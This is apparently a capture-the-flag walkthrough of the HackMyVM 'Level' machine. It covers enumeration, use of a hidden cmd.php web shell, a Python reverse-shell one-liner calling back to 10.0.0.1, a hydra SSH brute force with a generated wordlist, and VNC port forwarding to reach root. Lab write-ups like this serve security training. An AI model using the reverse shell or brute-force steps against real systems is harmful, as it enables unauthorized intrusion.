---
layout: default
title : muzec - Level - HackMyVm 
---

### Enumeration With Nmap

We always start with an nmap scan.....

```Nmap -sC -sV -p- -oA nmap <Target-IP> -vv```

```
# Nmap 7.91 scan initiated Tue Nov  2 15:05:34 2021 as: nmap -sC -sV -p- -oA nmap -vv 172.16.109.148
Nmap scan report for Level (172.16.109.148)
Host is up, received syn-ack (0.00018s latency).
Scanned at 2021-11-02 15:05:36 WAT for 13s
Not shown: 65530 closed ports
Reason: 65530 conn-refused
PORT      STATE SERVICE     REASON  VERSION
21/tcp    open  ftp         syn-ack vsftpd 3.0.3
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:172.16.109.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 17
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp    open  http        syn-ack Apache httpd 2.4.38 ((Debian))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Site doesn't have a title (text/html).
139/tcp   open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn syn-ack Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
65000/tcp open  ssh         syn-ack OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 e0:e7:a1:e4:f8:6f:ce:9f:e5:b8:61:a0:83:e8:e4:77 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCSuyQPkNmtquTSG9jsVp6z8SzyaczxGowK1kL9qtfhRbgepfU68kcXBTucWUcmxCw1ViwPbiArKccPV6JDYkRLe840/+uxDShv6n0Bj6SZa0MncEKAoal4gxgdV8Ojlh35eIGmYJe5HAvD7HXSKJlSU08Bp2QKh/9PCSik9avc+b/W5P8cyXdzds7p6KbmEPSViUrxdhb3Bo0b3ayYWHwXCwHMq39mdW8mqXCy9bJ0tIibW9WunyUQhfqSbmSRQhsZ2w0IdxWCdIr71O/sPcrL9JRJCu61ZXIlj41MjPqZZQtEPkG9LGVn/I2GCe67Kyl4HamVyQ+uOVGTGJCqDNkZ
|   256 69:6a:91:6b:bb:bf:60:55:dc:a3:0b:8f:53:b7:83:7b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLnIrruWMPYS7KFgoi/AVk2WCw79q7t1HPy57cw2SsmR5+tPMLWsGi1MmjKAdwMghv6gFoAgT3ca4ZFO0/nh7l0=
|   256 8e:92:3d:35:d2:25:4e:e2:f4:1e:21:70:56:56:94:e4 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAII+Brt0al7iE9d14a4eGYjYmwYWLu0pDGJ0UQlec0HWj
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -20m01s, deviation: 34m37s, median: -2s
| nbstat: NetBIOS name: LEVEL, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   LEVEL<00>            Flags: <unique><active>
|   LEVEL<03>            Flags: <unique><active>
|   LEVEL<20>            Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 23984/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 63689/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 29708/udp): CLEAN (Failed to receive data)
|   Check 4 (port 33592/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.9.5-Debian)
|   Computer name: level
|   NetBIOS computer name: LEVEL\x00
|   Domain name: \x00
|   FQDN: level
|_  System time: 2021-11-02T15:05:47+01:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-11-02T14:05:47
|_  start_date: N/A

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Nov  2 15:05:49 2021 -- 1 IP address (1 host up) scanned in 15.09 seconds
```

So much information man let break it down.

```
21 - FTP - We have anonymous login allowed
80 - HTTP - Running apache webserver 2.4.38 ((Debian))
139 - NETBIOS-SSN - Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445 - NETBIOS-SSN - Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
65000 - SSH -  OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
```

We are having 5 open ports which cool i guess the more the ports the more the enumeration to be carried out yes man we are hitting all ports starting from the top.


### Enumeration On Port 21 FTP

```
┌──(muzec㉿Muzec-Security)-[~/Documents/HackMyVm/level]
└─$ ftp 172.16.109.148
Connected to 172.16.109.148.
220 (vsFTPd 3.0.3)
Name (172.16.109.148:muzec): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        115          4096 Jan 02  2021 .
drwxr-xr-x    2 0        115          4096 Jan 02  2021 ..
226 Directory send OK.
ftp> 
```
But seems the FTP is empty with no files ahhhh it ok let move forward.

### Enumeration On Port 139,445 SMB 

```
┌──(muzec㉿Muzec-Security)-[~/Documents/HackMyVm/level]
└─$ smbclient -L //172.16.109.148/ -N      

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        IPC$            IPC       IPC Service (Samba 4.9.5-Debian)
SMB1 disabled -- no workgroup available
```

Dead end also we have no shares to access let run `enum4linux` to gather some information man.

![image](https://user-images.githubusercontent.com/69868171/140058087-409b2c87-00cb-4692-bc28-199ab9b3f740.png)

Not to much information just some usernames some default and a valid one `one` i guess not wasting to much of time let move forward.

### Enumeration On Port 80 HTTP

![image](https://user-images.githubusercontent.com/69868171/140058732-13cdf7c3-5ab0-4c0d-a80a-fd6b59b4a506.png)

I have the habit of running dirbuster on any webserver am testing first to burst for some hidden fast directories.

![image](https://user-images.githubusercontent.com/69868171/140059232-4e9d59cf-93d9-4375-b63c-f0da8d58d181.png)


```
---- Scanning URL: http://172.16.109.148/ ----
+ http://172.16.109.148/index.html (CODE:200|SIZE:8)                                                                                                                  
+ http://172.16.109.148/robots.txt (CODE:200|SIZE:370)                                                                                                                
+ http://172.16.109.148/server-status (CODE:403|SIZE:279)
```

Let check what we have on `robots.txt`.

![image](https://user-images.githubusercontent.com/69868171/140059989-10990d16-6750-4812-b39f-c7e32c4e71d2.png)

Directories listed on `robots.txt` are all rabbit hole should have gotten it in dirbuster result when we burst for directories.

![image](https://user-images.githubusercontent.com/69868171/140060553-34c1f637-97e4-43e7-a4a6-9c3542a6c8e1.png)

But seems we still have a lot to see in the `robots.txt` file strolling down a bit and we found something interesting a Brainfuck language.

```
++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>+++++++++++++++++.>>++++++++.-------.+++++++++++++++++.-----------------.+++++++.++++++++.-----.+++.+++++++.
```

![image](https://user-images.githubusercontent.com/69868171/140061203-1b4f1d8a-93f8-4ec1-956c-541b218ecd93.png)

A secret directory cool let browse it.

![image](https://user-images.githubusercontent.com/69868171/140061499-fef673f3-d596-4ad2-8ff1-c71982eb9e61.png)

Hehehehe we found a wordlist for directory brute forcing.

![image](https://user-images.githubusercontent.com/69868171/140061764-45f7d8e9-50e6-42a0-80f1-8e03806bdc70.png)

So i wget it onto my machine now let hit gobuster to brute force directories.

```
┌──(muzec㉿Muzec-Security)-[~/Documents/HackMyVm/level]
└─$ gobuster dir -u http://172.16.109.148 -w leveltory-list-2.3-medium.txt -x php,phtml,html,txt,old
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.16.109.148
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                leveltory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,phtml,html,txt,old
[+] Timeout:                 10s
===============================================================
2021/11/03 10:42:45 Starting gobuster in directory enumeration mode
===============================================================
/Level2021            (Status: 301) [Size: 320] [--> http://172.16.109.148/Level2021/]
                                                                                      
===============================================================
2021/11/03 10:42:57 Finished
===============================================================
```

Let browser it and see what we have.

![image](https://user-images.githubusercontent.com/69868171/140062641-14bec015-f835-49b1-a43e-58a4adc90a1d.png)

But it was blank checking source nothing let brute force the endpoint to see if we have more directories hidden .

```
┌──(muzec㉿Muzec-Security)-[~/Documents/HackMyVm/level]
└─$ gobuster dir -u http://172.16.109.148/Level2021/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,phtml,html,txt,old
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.16.109.148/Level2021/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,phtml,html,txt,old
[+] Timeout:                 10s
===============================================================
2021/11/03 10:49:26 Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 1]
/cmd.php              (Status: 200) [Size: 145]

```
Boom let browse through it and i got an error.

![image](https://user-images.githubusercontent.com/69868171/140063624-3786d9ef-dfba-4a6c-a420-3d73a5360e30.png)

```
 Warning: shell_exec(): Cannot execute a blank command in /var/www/html/Level2021/cmd.php on line 2
 ```
 seems we can execute a command let try it.
 
 ![image](https://user-images.githubusercontent.com/69868171/140063838-74cbfa7d-180c-4de9-b6f2-7fd5a9b8f003.png)

Boom we can execute a command is cool let get a reverse shell back to us.

### Shell As WWW-DATA

Let confirm which python is running on the target.

![image](https://user-images.githubusercontent.com/69868171/140064417-b39d7efd-9d83-49da-b410-f5d58e9b745b.png)

Payload to get a reverse shell;

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

![image](https://user-images.githubusercontent.com/69868171/140064767-a6fbeade-f654-4bd5-9e6b-ebdfe8bc6744.png)

Netcat listener ready now let run it and checking back our ncat listener and we have shell.

![image](https://user-images.githubusercontent.com/69868171/140069432-fe2172a5-50be-4748-9b9b-18cd13588871.png)

Now let spawn a tty shell.

```
┌──(muzec㉿Muzec-Security)-[~/Documents/HackMyVm/level]
└─$ nc -nvlp 1337                                                                             
listening on [any] 1337 ...
connect to [172.16.109.1] from (UNKNOWN) [172.16.109.148] 44982
/bin/sh: 0: can't access tty; job control turned off
$ python -c 'import pty; pty.spawn ("/bin/bash")'
www-data@Level:/var/www/html/Level2021$ ^Z
zsh: suspended  nc -nvlp 1337
                                                                                                                                                                       
┌──(muzec㉿Muzec-Security)-[~/Documents/HackMyVm/level]
└─$ stty raw -echo; fg                                                                                                                                       148 ⨯ 1 ⚙
[1]  + continued  nc -nvlp 1337

www-data@Level:/var/www/html/Level2021$ stty rows 17 cols 190
www-data@Level:/var/www/html/Level2021$ export TERM=xterm
www-data@Level:/var/www/html/Level2021$ 
```

```
python -c 'import pty; pty.spawn ("/bin/bash")'
Ctrl Z
stty raw -echo; fg 
enter
enter
stty rows 17 cols 190
export TERM=xterm
```

Now we have a stable shell let gather more information checking the passwd file to confirm how many users we have on the target.

![image](https://user-images.githubusercontent.com/69868171/140071946-1075aaac-83af-4f95-a653-61cfc3be3419.png)

We have only one user which we found when enumerating SMB if we can recall now let dig more.

![image](https://user-images.githubusercontent.com/69868171/140072413-e2bc0e73-13eb-4e3f-a170-b27687a88a9f.png)

Ahhh yes we have no access to the home directory of the user `one` and seems we have a secret file left for us let cat it.

![image](https://user-images.githubusercontent.com/69868171/140072681-fb2136c5-7f8e-4797-a57c-8dd9e5f7ea69.png)

Smooth great time to create a custom wordlist with the help of crunch tools.

```
┌──(muzec㉿Muzec-Security)-[~/Documents/HackMyVm/level]
└─$ crunch 3 3 0123456789 > level.txt
Crunch will now generate the following amount of data: 4000 bytes
0 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 1000
```
So with the help of `crunch` i was able to generate the following number of lines: 1000 with random combination with minimum 3 and maximum 3 .

![image](https://user-images.githubusercontent.com/69868171/140075252-4e86ee93-c8a2-4ee6-8b30-537e8d59207a.png)

Now let use a simple bash script to generate our wordlists.

```
#!/bin/bash
#author:- Muzec

for x in $(cat level.txt); 
        do echo "0n30n3"$x  >> level1.txt ;done
```

![image](https://user-images.githubusercontent.com/69868171/140077714-f69ebaaf-3c68-46b7-bfb6-b2f85aafd948.png)

We have our wordlist ready now hit SSH.

### Enumeration On Port 65000 SSH

Brute forcing SSH using hydra with our wordlist we just created.

```
┌──(muzec㉿Muzec-Security)-[~/Documents/HackMyVm/level]
└─$ hydra -l one -P level1.txt ssh://172.16.109.148:65000
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-11-03 12:20:13
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 1000 login tries (l:1/p:1000), ~63 tries per task
[DATA] attacking ssh://172.16.109.148:65000/
[STATUS] 176.00 tries/min, 176 tries in 00:01h, 824 to do in 00:05h, 16 active
[STATUS] 112.00 tries/min, 336 tries in 00:03h, 664 to do in 00:06h, 16 active
[65000][ssh] host: 172.16.109.148   login: one   password: 0n30n3666
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-11-03 12:26:25
```

Boom we have the right credentials now let log in SSH.

### SSH as User One

![image](https://user-images.githubusercontent.com/69868171/140079642-132ddd4f-03aa-4b79-a985-a8b8f165344a.png)

We are in and we have user.txt.

![image](https://user-images.githubusercontent.com/69868171/140080295-787c5b69-c2ff-4a66-bd05-dea6b3865866.png)

### Privilege Escalation

First thing first let check `sudo -l` .

![image](https://user-images.githubusercontent.com/69868171/140081460-9721d207-aaf7-4b34-9ced-b3120a5e8a90.png)

Nah no `Sudo` let check `SUID` .

```
one@Level:~$ find / -perm -u=s -type f 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/su
/usr/bin/umount
/usr/bin/chsh
one@Level:~$ 
```
Nothing on `SUID` also let check if we have any ports running locally.

![image](https://user-images.githubusercontent.com/69868171/140082762-28364d54-34ec-440d-83d5-bf713f0d232d.png)

Interesting we have VNC port open locally on the target we can confirm it let port forward to our machine.

### Port Forwarding
```
┌──(muzec㉿Muzec-Security)-[~/Documents/HackMyVm/level]
└─$ ssh -L 5901:localhost:5901 one@172.16.109.148 -p65000
```

![image](https://user-images.githubusercontent.com/69868171/140085165-6bdefc7c-fd81-43ee-883b-f5383eef6c3f.png)


```
┌──(muzec㉿Muzec-Security)-[~/Documents/HackMyVm/level]
└─$ nmap -sV -sC localhost -p5901
Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-03 12:55 WAT
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000072s latency).
Other addresses for localhost (not scanned): ::1

PORT     STATE SERVICE VERSION
5901/tcp open  vnc     VNC (protocol 3.3; Locked out)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.53 seconds
```

But seems we need a password to be able to accesss VNC let go back to the target to enumerate more.

![image](https://user-images.githubusercontent.com/69868171/140089211-544d3b71-fc19-4deb-8980-2be3c52649f3.png)

We found a hidden directory with `...` let check it out .

![image](https://user-images.githubusercontent.com/69868171/140090342-0ec5b773-a9dd-4e57-be38-afd77014e886.png)

Possible our way to get access to the VNC let give it a try so i transfer the file to my machine.

```
┌──(muzec㉿Muzec-Security)-[~/Documents/HackMyVm/level]
└─$ vncviewer localhost:5901 -p remote_level
Connected to RFB server, using protocol version 3.8
Performing standard VNC authentication
Authentication successful
Desktop name "Level:1 (root)"
VNC server default format:
  32 bits per pixel.
  Least significant byte first in each pixel.
  True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0
Using default colormap which is TrueColor.  Pixel format:
  32 bits per pixel.
  Least significant byte first in each pixel.
  True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0
Same machine: preferring raw encoding
```

![image](https://user-images.githubusercontent.com/69868171/140091325-c82215b0-4747-4d08-8691-4d8f28e3fd08.png)

Using `remote_level` file and boom we are in with a root shell.

We are root and done.

Greeting From [Muzec](https://twitter.com/muzec_saminu)

<br> <br>
[Back To Home](../index.md)
<br>
